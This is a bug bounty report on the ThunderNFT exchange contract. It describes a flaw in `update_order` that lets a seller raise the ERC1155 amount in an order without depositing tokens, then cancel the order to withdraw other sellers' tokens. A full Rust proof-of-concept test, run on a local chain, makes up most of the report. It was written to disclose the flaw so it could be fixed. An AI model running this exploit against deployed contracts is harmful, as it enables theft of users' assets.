# IOP \_ ThunderNFT 34605 - \[Smart Contract - Critical] ERC tokens can be stolen because the amount is

Submitted on Sat Aug 17 2024 12:25:21 GMT-0400 (Atlantic Standard Time) by @Schnilch for [IOP | ThunderNFT](https://immunefi.com/bounty/thundernft-iop/)

Report ID: #34605

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/ThunderFuel/smart-contracts/tree/main/contracts-v1/thunder\\_exchange>

Impacts:

* Direct theft of any user NFTs, whether at-rest or in-motion, other than unclaimed royalties

## Description

## Brief/Intro

In the `update_order` function in the Thunder Exchange contract, there is no validation to check whether a seller has increased the amount of ERC1155 tokens being sold. This allows someone to simply increase the amount of tokens being sold without sending those tokens to the contract. The order could then be canceled, and since the amount is too high, the seller would receive more tokens than they actually possess.

## Vulnerability Details

On the exchange, ERC1155 tokens can also be sold. Since an ERC1155 token does not have to be unique, multiple tokens can be sold at once, which is why you can specify an amount when selling. In the `place_order` function, the amount is validated (see 1. reference). There it is checked whether the user actually sends the amount he specifies. If the order is then updated with `update_order`, an attacker can change the amount parameter, but it is not checked in the function (see 2. reference). Even in the strategy, the amount is not checked again and the order is simply overwritten. This means that an attacker can simply set any amount without transferring the tokens into the contract. If there are several users offering the same ERC1155 tokens, the attacker can steal all of these tokens by setting the amount of his sell order to the balance of the ERC1155 tokens that the thunder exchange has and then canceling his order with `cancel_order`. In doing so, he gets back the amount of tokens that are in the order (see 3. reference).

## Impact Details

An attacker could steal all erc1155 tokens that are being sold, of which he himself has at least one, in order to be able to create an order. The attacker could also buy this one erc1155 token and then steal the others.

## References

1. <https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder\\_exchange/src/main.sw#L96-L102>
2. <https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder\\_exchange/src/main.sw#L124>
3. <https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder\\_exchange/src/main.sw#L155-L167>

## Proof of concept

## Proof of Concept

Since the POC is in rust a bit of setup is needed. To do this, he following steps must be carried out:

1. In the `smart-contracts` folder: `cargo new thunder-tests`
2. Open the `Cargo.toml` in `thunder-tests` and add these dev-dependencies:

```
[dev-dependencies]
fuels = { version = "0.62.0", features = ["fuel-core-lib"] }
tokio = { version = "1.12", features = ["rt", "macros"] }
```

3. Then this code needs to be inserted into `thunder-tests/src/main.rs`:

```
use std::str::FromStr;

use fuels::{
    accounts::wallet::Wallet, prelude::*, types::{
        Bits256, ContractId, Identity
    }
};

/////////////////////////////////////Setup/////////////////////////////////////
abigen!(
    Contract(
        name = "AssetManager",
        abi = "/home/schnilch/Fuel/thunder-nft/contracts-v1/asset_manager/out/debug/asset_manager-abi.json"
    ),
    Contract(
        name = "ExecutionManager",
        abi = "/home/schnilch/Fuel/thunder-nft/contracts-v1/execution_manager/out/debug/execution_manager-abi.json"
    ),
    Contract(
        name = "ThunderExchange",
        abi = "/home/schnilch/Fuel/thunder-nft/contracts-v1/thunder_exchange/out/debug/thunder_exchange-abi.json"
    ),
    Contract(
        name = "Pool",
        abi = "/home/schnilch/Fuel/thunder-nft/contracts-v1/pool/out/debug/pool-abi.json"
    ),
    Contract(
        name = "RoyaltyManager",
        abi = "/home/schnilch/Fuel/thunder-nft/contracts-v1/royalty_manager/out/debug/royalty_manager-abi.json"
    ),
    Contract(
        name = "Strategy",
        abi = "/home/schnilch/Fuel/thunder-nft/contracts-v1/execution_strategies/strategy_fixed_price_sale/out/debug/strategy_fixed_price_sale-abi.json"
    ),
    Contract(
        name = "ERC1155",
        abi = "/home/schnilch/Fuel/thunder-nft/contracts-v1/erc1155/out/debug/erc1155-abi.json"
    )
);


pub type Accounts = [WalletUnlocked; 5];

const STRATEGY_FEE: u64 = 50;
const ROYALTY_MANAGER_FEE_LIMIT: u64 = 500;
pub const BASE_ASSET: AssetId = AssetId::new([0u8; 32]);
pub const ERC1155_NFT_STR: &str = "53a2ce8ca7a1cecfd3c9256797d8edce464f4d6deef427cad7b68a32f4340b0c";

pub async fn get_wallets() -> Accounts {
    let mut wallets = launch_custom_provider_and_get_wallets(
        WalletsConfig::new(
            Some(5),             /* Single wallet */
            Some(1),             /* Single coin (UTXO) */
            Some(1_000_000_000), /* Amount per coin */
        ),
        None,
        None,
    )
    .await
    .unwrap();
    let owner = wallets.pop().unwrap();
    let alice = wallets.pop().unwrap();
    let bob = wallets.pop().unwrap();
    let user1 = wallets.pop().unwrap();
    let user2 = wallets.pop().unwrap();

    [owner, alice, bob, user1, user2]
}

//The following functions set up all required contracts and initialize them
pub async fn setup_asset_manager(owner: WalletUnlocked) -> (AssetManager<WalletUnlocked>, ContractId){
    let asset_manager_id = Contract::load_from(
        "/home/schnilch/Fuel/thunder-nft/contracts-v1/asset_manager/out/debug/asset_manager.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    .deploy(&owner, TxPolicies::default())
    .await
    .unwrap();
 
    let asset_manager = AssetManager::new(asset_manager_id.clone(), owner.clone());

    asset_manager.methods().initialize().call().await.unwrap();
    (asset_manager, asset_manager_id.into())
}

pub async fn setup_execution_manager(owner: WalletUnlocked) -> (ExecutionManager<WalletUnlocked>, ContractId) {
    let execution_manager_id = Contract::load_from(
        "/home/schnilch/Fuel/thunder-nft/contracts-v1/execution_manager/out/debug/execution_manager.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    .deploy(&owner, TxPolicies::default())
    .await
    .unwrap();
 
    let execution_manager = ExecutionManager::new(execution_manager_id.clone(), owner.clone());

    execution_manager.methods().initialize().call().await.unwrap();
    (execution_manager, execution_manager_id.into())
}

pub async fn setup_thunder_exchange(owner: WalletUnlocked) -> (ThunderExchange<WalletUnlocked>, ContractId){
    let thunder_exchange_id = Contract::load_from(
        "/home/schnilch/Fuel/thunder-nft/contracts-v1/thunder_exchange/out/debug/thunder_exchange.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    .deploy(&owner, TxPolicies::default())
    .await
    .unwrap();
 
    let thunder_exchange = ThunderExchange::new(thunder_exchange_id.clone(), owner.clone());

    thunder_exchange.methods().initialize().call().await.unwrap();
    (thunder_exchange, thunder_exchange_id.into())
}

pub async fn setup_pool(owner: WalletUnlocked, thunder_exchange: ContractId, asset_manager: ContractId) -> (Pool<WalletUnlocked>, ContractId){
    let pool_id = Contract::load_from(
        "/home/schnilch/Fuel/thunder-nft/contracts-v1/pool/out/debug/pool.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    .deploy(&owner, TxPolicies::default())
    .await
    .unwrap();
 
    let pool = Pool::new(pool_id.clone(), owner.clone());

    pool.methods().initialize(thunder_exchange, asset_manager).call().await.unwrap();
    (pool, pool_id.into())
}

pub async fn setup_royalty_manager(owner: WalletUnlocked) -> (RoyaltyManager<WalletUnlocked>, ContractId){
    let royalty_manager_id = Contract::load_from(
        "/home/schnilch/Fuel/thunder-nft/contracts-v1/royalty_manager/out/debug/royalty_manager.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    .deploy(&owner, TxPolicies::default())
    .await
    .unwrap();
 
    let royalty_manager = RoyaltyManager::new(royalty_manager_id.clone(), owner.clone());

    royalty_manager.methods().initialize().call().await.unwrap();
    (royalty_manager, royalty_manager_id.into())
}

pub async fn setup_strategy(owner: WalletUnlocked, thunder_exchange: ContractId) -> (Strategy<WalletUnlocked>, ContractId){
    let strategy_id = Contract::load_from(
        "/home/schnilch/Fuel/thunder-nft/contracts-v1/execution_strategies/strategy_fixed_price_sale/out/debug/strategy_fixed_price_sale.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    .deploy(&owner, TxPolicies::default())
    .await
    .unwrap();
 
    let strategy = Strategy::new(strategy_id.clone(), owner.clone());

    strategy.methods().initialize(thunder_exchange).call().await.unwrap();
    (strategy, strategy_id.into())
}

pub async fn setup_erc1155(owner: WalletUnlocked, nft_holder: Address) -> (ERC1155<WalletUnlocked>, ContractId) {
    let erc1155_id = Contract::load_from(
        "/home/schnilch/Fuel/thunder-nft/contracts-v1/erc1155/out/debug/erc1155.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    .deploy(&owner, TxPolicies::default())
    .await
    .unwrap();
 
    let erc1155 = ERC1155::new(erc1155_id.clone(), owner.clone());

    erc1155.methods().constructor(Identity::Address(owner.address().into())).call().await.unwrap();

    (erc1155, erc1155_id.into())
}

pub async fn post_setup(
    strategy: Strategy<WalletUnlocked>, 
    royalty_manager: RoyaltyManager<WalletUnlocked>,
    thunder_exchange: ThunderExchange<WalletUnlocked>,
    execution_manager: ExecutionManager<WalletUnlocked>,
    asset_manager: AssetManager<WalletUnlocked>,
    pool_id: ContractId,
    protocol_fee_recipient: Address,
    nft_holder: Address
) {
    strategy.methods().set_protocol_fee(STRATEGY_FEE).call().await.unwrap();
    royalty_manager.methods().set_royalty_fee_limit(ROYALTY_MANAGER_FEE_LIMIT).call().await.unwrap();
    
    thunder_exchange.methods().set_pool(pool_id).call().await.unwrap();
    thunder_exchange.methods().set_execution_manager(execution_manager.id()).call().await.unwrap();
    thunder_exchange.methods().set_royalty_manager(royalty_manager.id()).call().await.unwrap();
    thunder_exchange.methods().set_asset_manager(asset_manager.id()).call().await.unwrap();
    thunder_exchange.methods().set_protocol_fee_recipient(Identity::Address(protocol_fee_recipient)).call().await.unwrap();

    execution_manager.methods()
        .add_strategy(strategy.id())
        .call()
        .await
        .unwrap();

    asset_manager.methods()
        .add_asset(BASE_ASSET)
        .call()
        .await
        .unwrap();
}

async fn get_contract_instances() -> (
    Accounts,
    (AssetManager<WalletUnlocked>, ContractId), 
    (ExecutionManager<WalletUnlocked>, ContractId),
    (ThunderExchange<WalletUnlocked>, ContractId),
    (Pool<WalletUnlocked>, ContractId),
    (RoyaltyManager<WalletUnlocked>, ContractId),
    (Strategy<WalletUnlocked>, ContractId),
    (ERC1155<WalletUnlocked>, ContractId)
) {
    let accounts = get_wallets().await;
 
    let (asset_manager, asset_manager_id) = setup_asset_manager(accounts[0].clone()).await;
    let (execution_manager, execution_manager_id) = setup_execution_manager(accounts[0].clone()).await;
    let (thunder_exchange, thunder_exchange_id) = setup_thunder_exchange(accounts[0].clone()).await;
    let (pool, pool_id) = setup_pool(accounts[0].clone(), thunder_exchange_id, asset_manager_id).await;
    let (royalty_manager, royalty_manager_id) = setup_royalty_manager(accounts[0].clone()).await;
    let (strategy, strategy_id) = setup_strategy(accounts[0].clone(), thunder_exchange_id).await;
    let (erc1155, erc1155_id) = setup_erc1155(accounts[0].clone(), accounts[1].address().into()).await;

    post_setup(
        strategy.clone(),
        royalty_manager.clone(),
        thunder_exchange.clone(),
        execution_manager.clone(),
        asset_manager.clone(),
        pool_id,
        accounts[4].address().into(),
        accounts[1].address().into()
    ).await;
 
    (
        accounts,
        (asset_manager, asset_manager_id), 
        (execution_manager, execution_manager_id),
        (thunder_exchange, thunder_exchange_id),
        (pool, pool_id),
        (royalty_manager, royalty_manager_id),
        (strategy, strategy_id),
        (erc1155, erc1155_id)
    )
}
/////////////////////////////////////Setup End/////////////////////////////////////

/////////////////////////////////////POC/////////////////////////////////////
#[tokio::test]
async fn test_poc() {
    let (
        [_owner, alice, bob, ..],
        (_asset_manager, asset_manager_id), 
        (_execution_manager, execution_manager_id),
        (thunder_exchange, _thunder_exchange_id),
        (pool, pool_id),
        (_royalty_manager, _royalty_manager_id),
        (strategy, strategy_id),
        (erc1155, erc1155_id)
    ) = get_contract_instances().await;
    let ERC1155_NFT = AssetId::from_str(ERC1155_NFT_STR).unwrap();
    let thunder_exchange_alice = thunder_exchange.clone().with_account(alice.clone());
    let thunder_exchange_bob = thunder_exchange.clone().with_account(bob.clone());

    //ERC1155 tokens for Alice and Bob are minted. Alice gets 100 and Bob gets 1. 
    //Bob becomes the attacker in this POC who steals the ERC1155 tokens from Alice.
    erc1155.methods()
        .mint(alice.address().into(), Bits256::zeroed(), 100)
        .append_variable_outputs(1)
        .call()
        .await
        .unwrap();
    erc1155.methods()
        .mint(bob.address().into(), Bits256::zeroed(), 1)
        .append_variable_outputs(1)
        .call()
        .await
        .unwrap();
    
    //These are the parameters for alice sell order. This will allow her to sell her 100 ERC1155 tokens for a price of 1000
    let maker_order_input_alice = MakerOrderInput {
        maker: alice.address().into(),
        collection: erc1155_id.clone(),
        price: 1000,
        amount: 100,
        nonce: 1,
        strategy: strategy_id,
        payment_asset: BASE_ASSET,
        expiration_range: 10000,
        token_id: Bits256::zeroed(),
        side: Side::Sell,
        extra_params: ExtraParams {
            extra_address_param: Address::zeroed(),
            extra_contract_param: ContractId::zeroed(),
            extra_u_64_param: 0
        }
    };

    //alice places her order on the thunder exchange and sends her 100 tokens
    thunder_exchange_alice.methods()
        .place_order(maker_order_input_alice)
        .call_params(CallParameters::new(100, ERC1155_NFT, 1_000_000))
        .unwrap()
        .append_contract(execution_manager_id.into())
        .append_contract(strategy_id.into())
        .append_contract(pool_id.into())
        .append_contract(asset_manager_id.into())
        .call()
        .await
        .unwrap();
    println!("-----------Alice sells 100 ERC1155 tokens-----------");
    println!("alice ERC1155 balance: {:#?}\n\n",  alice.get_asset_balance(&ERC1155_NFT).await.unwrap()); //Shows that alice has no more ERC1155 tokens
    
    //These are the parameters for bobs sell order. This will allow him to sell his 1 ERC1155 token for a price of 10
    let mut maker_order_input_bob = MakerOrderInput {
        maker: bob.address().into(),
        collection: erc1155_id.clone(),
        price: 10,
        amount: 1,
        nonce: 1,
        strategy: strategy_id,
        payment_asset: BASE_ASSET,
        expiration_range: 10000,
        token_id: Bits256::zeroed(),
        side: Side::Sell,
        extra_params: ExtraParams {
            extra_address_param: Address::zeroed(),
            extra_contract_param: ContractId::zeroed(),
            extra_u_64_param: 0
        }
    };
    
    //bob places his order on the thunder exchange and sends his 1 token
    thunder_exchange_bob.methods()
        .place_order(maker_order_input_bob.clone())
        .call_params(CallParameters::new(1, ERC1155_NFT, 1_000_000))
        .unwrap()
        .append_contract(execution_manager_id.into())
        .append_contract(strategy_id.into())
        .append_contract(pool_id.into())
        .append_contract(asset_manager_id.into())
        .call()
        .await
        .unwrap();

    println!("-----------Bob sells 1 ERC1155 token-----------");
    println!("bob ERC1155 balance: {:#?}\n\n",  bob.get_asset_balance(&ERC1155_NFT).await.unwrap()); //Shows that bob has no more ERC1155 tokens

    // Bob now sets his amount to the total balance of ERC1155 tokens that the thunder exchange has.
    maker_order_input_bob.amount = 101;
    thunder_exchange_bob.methods() //Bob updates his amount without sending the tokens to the thunder exchange
        .update_order(maker_order_input_bob.clone())
        .append_contract(execution_manager_id.into())
        .append_contract(strategy_id.into())
        .append_contract(pool_id.into())
        .append_contract(asset_manager_id.into())
        .call()
        .await
        .unwrap();

    println!("-----------Bob updated his order-----------");
    println!("bob order amount: {:#?}\n\n", strategy.methods() //This shows that the amount has really been increased
        .get_maker_order_of_user(bob.address(), 1, Side::Sell)
        .call()
        .await
        .unwrap()
        .value
        .unwrap()
        .amount
    );

    //Bob cancels his order, which means he receives the amount of tokens that are in the order.
    //This means he gets his 1 token back and then the 100 that actually belong to Alice
    thunder_exchange_bob.methods()
        .cancel_order(strategy_id, 1, Side::Sell)
        .append_contract(execution_manager_id.into())
        .append_contract(strategy_id.into())
        .append_contract(pool_id.into())
        .append_contract(asset_manager_id.into())
        .append_variable_outputs(1)
        .call()
        .await
        .unwrap();
    println!("-----------Bob canceled his order-----------");
    //This shows that alice has no ERC1155 tokens left and bob has all
    println!("alice balance: {:#?}", alice.get_asset_balance(&ERC1155_NFT).await.unwrap());
    println!("bob balance: {:#?}", bob.get_asset_balance(&ERC1155_NFT).await.unwrap());
}

```

Since an erc1155 token is required for the POC, a smart contract must be created in the `contracts-v1` folder:

1. In `contracts-v1`: `force new erc1155`
2. Add these dependencies to the Forc.toml of the erc1155 contract:

```
standards = { git = "https://github.com/FuelLabs/sway-standards", tag = "v0.4.3" }
```

3. Paste the code into `contracts-v1/erc1155/src/main.sw` (The code is mainly copied from <https://docs.fuel.network/docs/sway/blockchain-development/native\\_assets/#multi-native-asset-example>):

```
contract;
 
use standards::src5::{SRC5, State};
use standards::src20::SRC20;
use standards::src3::SRC3;
use std::{
    asset::{
        burn,
        mint_to,
    },
    call_frames::{
        msg_asset_id,
    },
    hash::{
        Hash,
    },
    context::this_balance,
    storage::storage_string::*,
    string::String
};
 
storage {
    total_assets: u64 = 0,
    total_supply: StorageMap<AssetId, u64> = StorageMap {},
    name: StorageMap<AssetId, StorageString> = StorageMap {},
    symbol: StorageMap<AssetId, StorageString> = StorageMap {},
    decimals: StorageMap<AssetId, u8> = StorageMap {},
    owner: State = State::Uninitialized,
}
 
// Native Asset Standard
impl SRC20 for Contract {
    #[storage(read)]
    fn total_assets() -> u64 {
        storage.total_assets.read()
    }
 
    #[storage(read)]
    fn total_supply(asset: AssetId) -> Option<u64> {
        storage.total_supply.get(asset).try_read()
    }
 
    #[storage(read)]
    fn name(asset: AssetId) -> Option<String> {
        storage.name.get(asset).read_slice()
    }
    
    #[storage(read)]
    fn symbol(asset: AssetId) -> Option<String> {
        storage.symbol.get(asset).read_slice()
    }
 
    #[storage(read)]
    fn decimals(asset: AssetId) -> Option<u8> {
        storage.decimals.get(asset).try_read()
    }
}
 
// Mint and Burn Standard
impl SRC3 for Contract {
    #[storage(read, write)]
    fn mint(recipient: Identity, sub_id: SubId, amount: u64) {
        require_access_owner();
        let asset_id = AssetId::new(ContractId::this(), sub_id);
        log(asset_id);
        let supply = storage.total_supply.get(asset_id).try_read();
        if supply.is_none() {
            storage.total_assets.write(storage.total_assets.try_read().unwrap_or(0) + 1);
        }
        let current_supply = supply.unwrap_or(0);
        storage.total_supply.insert(asset_id, current_supply + amount);
        mint_to(recipient, sub_id, amount);
    }
    
    #[storage(read, write), payable]
    fn burn(sub_id: SubId, amount: u64) {
        require_access_owner();
        let asset_id = AssetId::new(ContractId::this(), sub_id);
        require(this_balance(asset_id) >= amount, "not-enough-coins");
        
        let supply = storage.total_supply.get(asset_id).try_read();
        let current_supply = supply.unwrap_or(0);
        storage.total_supply.insert(asset_id, current_supply - amount);
        burn(sub_id, amount);
    }
}
 
abi MultiAsset {
    #[storage(read, write)]
    fn constructor(owner_: Identity);
    
    #[storage(read, write)]
    fn set_name(asset: AssetId, name: String);
 
    #[storage(read, write)]
    fn set_symbol(asset: AssetId, symbol: String);
 
    #[storage(read, write)]
    fn set_decimals(asset: AssetId, decimals: u8);
}
 
impl MultiAsset for Contract {
    #[storage(read, write)]
    fn constructor(owner_: Identity) {
        require(storage.owner.read() == State::Uninitialized, "owner-initialized");
        storage.owner.write(State::Initialized(owner_));
    }
    
    #[storage(read, write)]
    fn set_name(asset: AssetId, name: String) {
        require_access_owner();
        storage.name.insert(asset, StorageString {});
        storage.name.get(asset).write_slice(name);
    }
 
    #[storage(read, write)]
    fn set_symbol(asset: AssetId, symbol: String) {
        require_access_owner();
        storage.symbol.insert(asset, StorageString {});
        storage.symbol.get(asset).write_slice(symbol);
    }
 
    #[storage(read, write)]
    fn set_decimals(asset: AssetId, decimals: u8) {
        require_access_owner();
        storage.decimals.insert(asset, decimals);
    }
}
 
#[storage(read)]
fn require_access_owner() {
    require(
        storage.owner.read() == State::Initialized(msg_sender().unwrap()),
        "not owner",
    );
}

```

4. Run forc build in all smart contract folders that are needed:
   * `contracts-v1/asset_manager`
   * `contracts-v1/erc1155`
   * `contracts-v1/execution_manager`
   * `contracts-v1/execution_strategies/strategy_fixed_price_sale`
   * `contracts-v1/interfaces`
   * `contracts-v1/libraries`
   * `contracts-v1/pool`
   * `contracts-v1/royalty_manager`
   * `contracts-v1/thunder_exchange`
5. To run the PoC go to the `thunder-tests` folder and run this command: `cargo test test_poc -- --nocapture`
